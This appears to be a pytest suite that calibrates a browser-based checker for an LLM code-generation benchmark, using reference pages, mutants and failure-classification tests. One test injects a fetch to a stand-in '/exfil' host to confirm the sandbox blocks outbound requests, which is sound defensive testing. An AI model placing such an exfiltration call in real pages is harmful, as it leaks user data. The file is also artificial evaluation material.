"""Mandatory real-browser checker calibration; fixture scores are not model results."""
import json
from pathlib import Path

import pytest

from llm_codegen_eval.behavior.browser import evaluate_browser
from llm_codegen_eval.behavior.checks import CHECKS, SCENARIOS
from llm_codegen_eval.behavior.suite import load_behavior_cases, SUITE_ROOT
from llm_codegen_eval.evaluators.html_eval import HtmlEvaluator

CASES = {c.case_id: c for c in load_behavior_cases()}
FIXTURES = json.loads((SUITE_ROOT / "fixtures.json").read_text())
TRIALS = [(entry["case_id"], entry["reference"], None) for entry in FIXTURES]
TRIALS += [(entry["case_id"], mutant["file"], mutant["expected_failed_check"])
           for entry in FIXTURES for mutant in entry["mutants"]]


@pytest.mark.browser
@pytest.mark.asyncio
@pytest.mark.parametrize("repeat", range(3))
@pytest.mark.parametrize("case_id,filename,failed_check", TRIALS)
async def test_reference_and_known_mutants(case_id, filename, failed_check, repeat, tmp_path):
    case = CASES[case_id]
    code = (SUITE_ROOT / "fixtures" / filename).read_text(encoding="utf-8")
    structural = await HtmlEvaluator().evaluate(code, case)
    assert structural.passed, "Known mutants must preserve structural compliance"
    outcome = await evaluate_browser(code, case, evidence_dir=tmp_path)
    assert outcome.smoke.passed, outcome.smoke
    assert not outcome.evidence_errors
    assert (tmp_path / outcome.evidence["screenshot"]).stat().st_size > 0
    assert (tmp_path / outcome.evidence["trace"]).stat().st_size > 0
    assert outcome.behavior.status == ("failed" if failed_check else "passed"), outcome.behavior
    if failed_check:
        failed = [c.check_id for c in outcome.behavior.checks if c.status == "failed"]
        assert failed == [failed_check], outcome.behavior
    else:
        assert [c.check_id for c in outcome.behavior.checks] == CHECKS[case.behavior_id]
        assert all(c.status == "passed" for c in outcome.behavior.checks)


@pytest.mark.browser
@pytest.mark.asyncio
async def test_load_error_is_not_a_behavior_failure(tmp_path):
    code = '<html><body><script>throw new Error("intentional page failure")</script></body></html>'
    outcome = await evaluate_browser(code, CASES["behavior_form"], tmp_path)
    assert outcome.smoke.failure_type == "console_error"
    assert outcome.behavior.status == "not_run"
    assert "intentional page failure" in outcome.page_errors[0]


@pytest.mark.browser
@pytest.mark.asyncio
async def test_checker_bug_is_not_a_generated_app_failure(monkeypatch):
    async def broken_checker(page, steps):
        raise ValueError("Internal checker fault")
    monkeypatch.setitem(SCENARIOS, "notes", broken_checker)
    code = (SUITE_ROOT / "fixtures" / "behavior_notes.html").read_text()
    outcome = await evaluate_browser(code, CASES["behavior_notes"])
    assert outcome.smoke.passed
    assert outcome.behavior.status == "checker_error"
    assert all(c.status == "not_run" for c in outcome.behavior.checks)


@pytest.mark.browser
@pytest.mark.asyncio
async def test_external_network_is_blocked(tmp_path):
    code = (SUITE_ROOT / "fixtures" / "behavior_notes.html").read_text()
    code = code.replace('<script>', '<script>fetch("https://example.invalid/exfil").catch(() => {});')
    outcome = await evaluate_browser(code, CASES["behavior_notes"], tmp_path)
    assert "https://example.invalid" in outcome.blocked_requests
    assert (tmp_path / "browser.json").is_file()


@pytest.mark.asyncio
async def test_missing_browser_is_checker_error():
    class Missing:
        async def __aenter__(self):
            raise RuntimeError("Browser not installed")
        async def __aexit__(self, *_):
            pass
    code = (SUITE_ROOT / "fixtures" / "behavior_form.html").read_text()
    outcome = await evaluate_browser(code, CASES["behavior_form"], playwright_factory=Missing)
    assert outcome.smoke.failure_type == "checker_error"
    assert "playwright install chromium" in outcome.smoke.detail
    assert outcome.behavior.status == "not_run"


@pytest.mark.asyncio
async def test_non_html_artifact_fails_load_without_browser():
    outcome = await evaluate_browser("Not an HTML artifact", CASES["behavior_form"])
    assert outcome.smoke.failure_type == "load_failure"
    assert outcome.behavior.status == "not_run"


def test_contracts_have_two_distinct_faults_each():
    assert len(CASES) == 5
    for fixture in FIXTURES:
        assert len(fixture["mutants"]) >= 2
        assert len({m["fault"] for m in fixture["mutants"]}) == len(fixture["mutants"])


@pytest.mark.browser
@pytest.mark.asyncio
async def test_incomplete_checker_is_not_a_pass(monkeypatch):
    async def incomplete(page, steps):
        return
    monkeypatch.setitem(SCENARIOS, "notes", incomplete)
    code = (SUITE_ROOT / "fixtures" / "behavior_notes.html").read_text()
    outcome = await evaluate_browser(code, CASES["behavior_notes"])
    assert outcome.smoke.passed
    assert outcome.behavior.status == "checker_error"


@pytest.mark.browser
@pytest.mark.asyncio
@pytest.mark.parametrize("control", ['<div data-testid="seconds"></div>',
    '<input data-testid="seconds" type="number" value="3"><input data-testid="seconds" type="number" value="3">'])
async def test_invalid_or_ambiguous_generated_controls_are_app_failures(control):
    case = CASES["behavior_timer"]
    code = (SUITE_ROOT / "fixtures" / "behavior_timer.html").read_text()
    code = code.replace('<input data-testid="seconds" type="number" min="1" value="3">', control)
    assert (await HtmlEvaluator().evaluate(code, case)).passed
    outcome = await evaluate_browser(code, case)
    assert outcome.smoke.passed
    assert outcome.behavior.status == "failed", outcome.behavior
    assert outcome.behavior.checks[0].check_id == "countdown-decreases"
    assert outcome.behavior.checks[0].status == "failed"
